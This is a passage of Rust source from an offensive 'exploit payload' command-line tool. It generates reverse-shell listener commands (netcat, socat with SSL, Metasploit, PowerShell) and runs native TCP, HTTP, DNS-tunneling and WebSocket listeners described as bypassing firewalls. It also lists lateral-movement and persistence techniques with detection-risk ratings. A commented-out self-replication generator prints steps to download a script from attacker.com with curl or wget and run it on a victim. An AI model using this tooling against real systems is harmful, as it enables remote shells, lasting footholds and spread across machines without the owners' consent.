        println!("  # Type commands in wscat terminal");

        Ok(())
    }

    fn generate_listener(&self, ctx: &CliContext) -> Result<(), String> {
        let port = ctx.get_flag_or("port", "4444");
        let use_ssl = ctx.has_flag("ssl");

        Output::header("Listener Commands");
        Output::item("Port", &port);

        println!("\n\x1b[1müéß Start Listener:\x1b[0m\n");

        println!("\x1b[1m1. Netcat (Traditional):\x1b[0m");
        println!("   nc -lvnp {}", port);

        println!("\n\x1b[1m2. Netcat (OpenBSD):\x1b[0m");
        println!("   nc -lvp {}", port);

        println!("\n\x1b[1m3. Ncat (Nmap):\x1b[0m");
        println!("   ncat -lvnp {}", port);

        if use_ssl {
            println!("\n\x1b[1m4. Socat with SSL:\x1b[0m");
            println!("   # Generate certificate:");
            println!("   openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt");
            println!("   cat shell.key shell.crt > shell.pem");
            println!("\n   # Start listener:");
            println!(
                "   socat OPENSSL-LISTEN:{},cert=shell.pem,verify=0 STDOUT",
                port
            );
        } else {
            println!("\n\x1b[1m4. Socat:\x1b[0m");
            println!("   socat TCP-LISTEN:{},reuseaddr,fork STDOUT", port);
        }

        println!("\n\x1b[1m5. Metasploit:\x1b[0m");
        println!("   msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {}; run\"", port);

        println!("\n\x1b[1m6. PowerShell (Windows):\x1b[0m");
        println!(
            "   $listener = [System.Net.Sockets.TcpListener]{};$listener.start();$client = $listener.AcceptTcpClient();",
            port
        );

        Ok(())
    }

    fn show_lateral_movement(&self, ctx: &CliContext) -> Result<(), String> {
        let technique = ctx.target.as_deref();

        Output::header("Lateral Movement Techniques");

        let commands = LateralMovementScanner::generate_movement_commands();

        if let Some(tech) = technique {
            if let Some(cmd) = commands.get(tech) {
                Output::item("Technique", tech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown technique: {}", tech));
                println!("\nAvailable techniques:");
            }
        }

        println!("\n\x1b[1mAvailable Techniques:\x1b[0m\n");

        let techniques = vec![
            ("ssh_key_reuse", "üîë SSH Key Reuse"),
            ("ssh_tunneling", "üåê SSH Tunneling & Port Forwarding"),
            ("psexec", "üíª PsExec (Windows)"),
            ("wmiexec", "‚öôÔ∏è  WMI Execution (Windows)"),
            ("pass_the_hash", "üîê Pass-the-Hash (Windows)"),
            ("smb_relay", "üîÑ SMB Relay Attack"),
            ("nfs_mount", "üìÅ NFS Mount Exploitation"),
            ("rsync_abuse", "üì¶ Rsync Abuse"),
            ("password_spraying", "üåßÔ∏è  Password Spraying"),
            ("metasploit_pivot", "üîÄ Metasploit Pivoting"),
            ("chisel_tunnel", "üîß Chisel Tunneling"),
        ];

        for (key, desc) in techniques {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload lateral {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1mWorks alongside:\x1b[0m");
        println!("  ‚Ä¢ CrackMapExec - Credential spraying");
        println!("  ‚Ä¢ BloodHound - Active Directory enumeration");
        println!("  ‚Ä¢ Impacket - SMB/WMI tools");
        println!("  ‚Ä¢ Metasploit - Pivoting framework");

        Ok(())
    }

    fn show_persistence(&self, ctx: &CliContext) -> Result<(), String> {
        let mechanism = ctx.target.as_deref();

        Output::header("Persistence Mechanisms");

        let commands = PersistenceMechanism::generate_persistence_commands();

        if let Some(mech) = mechanism {
            if let Some(cmd) = commands.get(mech) {
                Output::item("Mechanism", mech);
                println!("\n{}", cmd);
                return Ok(());
            } else {
                Output::error(&format!("Unknown mechanism: {}", mech));
                println!("\nAvailable mechanisms:");
            }
        }

        println!("\n\x1b[1müêß Linux Persistence:\x1b[0m\n");

        let linux_mechanisms = vec![
            ("cron_persistence", "‚è∞ Cron Job Persistence"),
            ("ssh_key_persistence", "üîë SSH Authorized Keys"),
            ("systemd_service", "‚öôÔ∏è  systemd Service"),
            ("bashrc_persistence", "üìù .bashrc/.profile Injection"),
        ];

        for (key, desc) in linux_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\x1b[1mü™ü Windows Persistence:\x1b[0m\n");

        let windows_mechanisms = vec![
            ("registry_run_key", "üìã Registry Run Keys"),
            ("scheduled_task", "‚è∞ Scheduled Tasks"),
            ("wmi_persistence", "‚öôÔ∏è  WMI Event Subscriptions"),
            ("sticky_keys", "üîê Sticky Keys Backdoor"),
        ];

        for (key, desc) in windows_mechanisms {
            println!("  {}", desc);
            println!("    \x1b[2mrb exploit payload persist {}\x1b[0m\n", key);
        }

        println!("\n\x1b[1m‚ö†Ô∏è  Detection Risk:\x1b[0m");
        println!("  ‚Ä¢ Cron/Scheduled Tasks: MEDIUM (visible in cron/task list)");
        println!("  ‚Ä¢ SSH Keys: LOW (requires checking authorized_keys)");
        println!("  ‚Ä¢ systemd/Registry: MEDIUM (visible in service/registry list)");
        println!("  ‚Ä¢ WMI Subscriptions: HIGH (advanced defenders check WMI)");
        println!("  ‚Ä¢ Sticky Keys: CRITICAL (easily detected, requires reboot)");

        Ok(())
    }

    fn start_listener(&self, ctx: &CliContext) -> Result<(), String> {
        let port = ctx.get_flag_or("port", "4444");
        let port_num: u16 = port
            .parse()
            .map_err(|_| format!("Invalid port: {}", port))?;

        let listener_type = ctx.get_flag_or("listener-type", "tcp");

        match listener_type.to_lowercase().as_str() {
            "tcp" => {
                Output::header("Native TCP Listener");
                Output::item("Port", &port);
                Output::item("Type", "TCP");
                println!();

                println!("\x1b[1müéß Starting TCP listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically\n");

                let listener = ExploitListener::new_tcp(port_num);
                listener.start()
            }
            "http" => {
                Output::header("Native HTTP Listener");
                Output::item("Port", &port);
                Output::item("Type", "HTTP");
                println!();

                println!("\x1b[1müéß Starting HTTP listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for HTTP reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses most firewalls (HTTP traffic allowed)\n");

                let listener = ExploitListener::new_http(port_num);
                listener.start()
            }
            "dns" => {
                Output::header("Native DNS Listener (DNS Tunneling)");
                Output::item("Port", &port);
                Output::item("Type", "DNS (Tunneling)");
                println!();

                println!("\x1b[1müéß Starting DNS listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for DNS tunneling reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses 99% of firewalls (DNS NEVER blocked!)");
                println!("  ‚Ä¢ ‚ö†Ô∏è  Requires root/sudo (port 53)\n");

                if port_num != 53 {
                    println!("\x1b[33m‚ö†Ô∏è  Warning: DNS typically uses port 53\x1b[0m");
                    println!("  Current port: {}", port_num);
                    println!("  Consider using: sudo rb exploit payload start --port 53 --listener-type dns\n");
                }

                let listener = ExploitListener::new_dns(port_num);
                listener.start()
            }
            "websocket" => {
                Output::header("Native WebSocket Listener (RFC 6455)");
                Output::item("Port", &port);
                Output::item("Type", "WebSocket");
                println!();

                println!("\x1b[1müéß Starting WebSocket listener...\x1b[0m");
                println!("  ‚Ä¢ Press Ctrl+C to stop");
                println!("  ‚Ä¢ Waiting for WebSocket reverse shell connections");
                println!("  ‚Ä¢ Sessions will be tracked automatically");
                println!("  ‚Ä¢ Bypasses 99% of firewalls (HTTP/HTTPS ports allowed!)");
                println!("  ‚Ä¢ Native implementation - NO external tools needed!\n");

                if port_num == 80 || port_num == 443 {
                    println!("\x1b[32m‚úÖ Using standard HTTP/HTTPS port - maximum firewall bypass!\x1b[0m\n");
                }

                let listener = ExploitListener::new_websocket(port_num);
                listener.start()
            }
            _ => Err(format!(
                "Unknown listener type: {}. Use: tcp, http, dns, or websocket",
                listener_type
            )),
        }
    }

    fn list_sessions(&self, ctx: &CliContext) -> Result<(), String> {
        Output::header("Active Reverse Shell Sessions");

        // TODO: This needs a global session manager
        // For now, we'll show a message
        println!("\n\x1b[33m‚ö†Ô∏è  Session management requires running listener\x1b[0m\n");

        println!("To start a listener and track sessions:");
        println!("  rb exploit payload start --port 4444\n");

        println!("Once connected, sessions will be displayed with:");
        println!("  ‚Ä¢ Session ID");
        println!("  ‚Ä¢ Remote IP:Port");
        println!("  ‚Ä¢ Connection time");
        println!("  ‚Ä¢ Session type (tcp-reverse, http-reverse, etc.)");

        Ok(())
    }

    /// Generate self-replication deployment script
    fn generate_self_replicate(&self, _ctx: &CliContext) -> Result<(), String> {
        // use crate::modules::exploit::self_replicate::SelfReplicator;

        Output::header("üîÑ Self-Replication Deployment Script Generator");
        Output::warning("‚ö†Ô∏è  TODO: self_replicate module needs to be implemented");
        return Err("Feature not yet implemented".to_string());

        /*
        Output::warning("‚ö†Ô∏è  AUTHORIZED USE ONLY - Deploy rb binary to victim systems");

        // Get flags
        let target_os = ctx.get_flag_or("os", "linux");
        let persistence = ctx.has_flag("persist");
        let output_file = ctx.get_flag("output").map(|s| s.to_string());

        Output::info(&format!("Target OS: {}", target_os));
        Output::info(&format!(
            "Persistence: {}",
            if persistence { "ENABLED" } else { "disabled" }
        ));

        // Create replicator
        Output::spinner_start("Extracting current binary");
        let mut replicator = SelfReplicator::new()?;
        replicator = replicator.with_os(&target_os).with_persistence(persistence);

        let binary_size = replicator.binary_size()?;
        Output::spinner_done();

        Output::item(
            "Binary path",
            replicator.binary_path().display().to_string().as_str(),
        );
        Output::item(
            "Binary size",
            &format!(
                "{} bytes ({:.2} KB)",
                binary_size,
                binary_size as f64 / 1024.0
            ),
        );

        // Extract and encode binary
        Output::spinner_start("Encoding binary as base64");
        replicator.extract_binary()?;
        Output::spinner_done();

        // Generate deployment script
        Output::spinner_start("Generating deployment script");
        let script = replicator.generate_script()?;
        Output::spinner_done();

        // Save or display
        if let Some(output_path) = output_file {
            Output::spinner_start(&format!("Saving to {}", output_path));
            replicator.save_script(&output_path)?;
            Output::spinner_done();

            Output::success(&format!("‚úÖ Deployment script saved to: {}", output_path));

            // Make executable on Unix
            #[cfg(unix)]
            Output::info("Script is executable (chmod +x applied)");

            println!();
            Output::header("üìã Usage Instructions");
            println!("\n1. Transfer script to victim:");
            match target_os.as_str() {
                "windows" => {
                    println!("   powershell -Command \"Invoke-WebRequest -Uri http://attacker.com/{} -OutFile deploy.ps1\"", output_path);
                    println!();
                    println!("2. Execute on victim:");
                    println!("   powershell -ExecutionPolicy Bypass -File deploy.ps1");
                }
                _ => {
                    println!("   curl http://attacker.com/{} -o deploy.sh", output_path);
                    println!("   wget http://attacker.com/{}", output_path);
                    println!();
                    println!("2. Execute on victim:");
                    println!("   bash {}", output_path);
                    println!("   chmod +x {} && ./{}", output_path, output_path);
                }
            }

            if persistence {
                println!();
                Output::info("üîí Persistence mechanisms will be installed automatically");
            }
        } else {
            // Display to stdout
            println!();
            Output::header("üìÑ Deployment Script");
            println!("\n{}", script);
            println!();
            Output::info("üí° Tip: Save to file with --output flag");
            println!(
                "   rb exploit payload replicate --os {} --output deploy.sh",
                target_os
            );
        }
        */

        // Ok(())
    }
}
